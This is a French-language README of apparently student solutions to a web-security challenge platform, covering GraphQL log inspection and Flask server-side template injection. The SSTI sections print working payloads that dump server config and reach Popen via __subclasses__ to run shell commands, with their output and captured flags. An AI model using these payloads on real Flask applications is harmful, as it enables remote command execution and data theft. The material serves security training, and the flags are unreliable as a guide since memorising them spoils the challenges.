# WebSecurity

Sujet du repo: [Resolutions des defis de securité web créé par BlackFoot](https://secu-web.blackfoot.dev)

## Open Field

### :x: Wordstress


## Graphql

### :white_circle: Confessions

Nom de la categorie: GraphQL -> inspection des requettes effectué.  
Le schema graphql est public.  
Exposition de la query **requestLog**, on peut y trouver la liste des requettes effectués et voir les hash demandés [cf DumpFile(/Graphql-Confessions/RequestLog.dump.json)](/Graphql-Confessions/RequestLog.dump.json).  
Dans [/Graphql-Confessions/RequestLog.23-05.json](/Graphql-Confessions/RequestLog.23-05.json) on trouve les requetes qui on été fait avant le debut du cours, le 23/05 (preparation du projet ?).  
Dans [/Graphql-Confessions/Hash.23-05.txt](/Graphql-Confessions/Hash.23-05.txt) on trouve la liste des hashs extraits des logs du 23/05.  
Apres inspection via la query **confession**, ils ont tous pour titre Flag, on peut donc supposer que le flag se trouve dans le messages de ces confessions.  
  
On a essayé:
  - [dcode sha256](https://www.dcode.fr/sha256-hash): rien trouvé
  - base64 to ascii: invalid
  - hex to ascii: invalid


## SSTI

### :heavy_check_mark: SSTI 1

Le nom de la category est SSTI (Server Side Template Injection).  
Le titre de la page est Flaaaasque, on peut donc conclure que le moteur utilisé est Flask.  
Apres test, on peut utiliser `{{8*8}}` pour tester et faire un calcul.  
En utilisant `{{config.items()}}` on peut obtenir la config du server.  
cf [/SSTI/SSTI_1/config.dump.txt](/SSTI/SSTI_1/config.dump.txt) un dump de la config du server.  
Flag trouvé: `('FLAG', 'BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}')`

### :heavy_check_mark: SSTI 2

Aussi du Flask, donc on peut utiliser `{{8*8}}`.  
En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_2/config.dump.txt) mais le flag ne s'y trouve pas.  
En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_2/class.dump.txt).  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268:]}}` permet de recuperer la class Popen.  
Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\nflag.txt\nindex.html\n', None)`.  
On peut voir un fichier appelé flag.txt, pour l'afficher, on peut utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('cat flag.txt', shell=True,stdout=-1).communicate()}}`, ce qui nous donne: `(b'BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}', None)`.  
On a donc trouvé le flag `BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}`

### :white_circle: SSTI 3

Encore du Flask, on peut toujour utiliser `{{8*8}}`.  
En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_3/config.dump.txt) mais le flag ne s'y trouve pas non plus.  
En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_3/class.dump.txt).  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[409:]}}` permet de recuperer la class Popen.  
Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[409]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\ngetFlag\nindex.html\n', None)`.  
Utiliser la commande `{{''.__class__.__mro__ [1].__subclasses__()[409]('cat getFlag', shell=True,stdout=-1).communicate()}}` nous donne le contenue du fichier [cf: getFlag](/SSTI/SSTI_3/getFlag).  
Le fichier [getFlag](/SSTI/SSTI_3/getFlag) semble etre un executable mais il ne veux pas se lancer.


### :x: SSTI 4


## SSRF

### :x: SSRF 1


## Obfuscation

### :x: OBF 100

### :x: SCRIPT_KIDDING


## XXE

### :x: XXE 1

### :x: XXE 2


## XSS

### :x: Whatsup

### :x: Whatsup2


## JWT

### :x: Mythique 1

### :x: Mythique 2

### :x: Mythique 3


## SQLI

### :x: Potionseller

### :x: Potionseller 2


## IFI

### :x: noprotection

### :x: filters

### :x: extprotect

### :x: remote


## Auth

### :x: Auth 50

### :x: Auth 100

### :x: Auth 200


## JS

### :x: b64js

### :x: JS200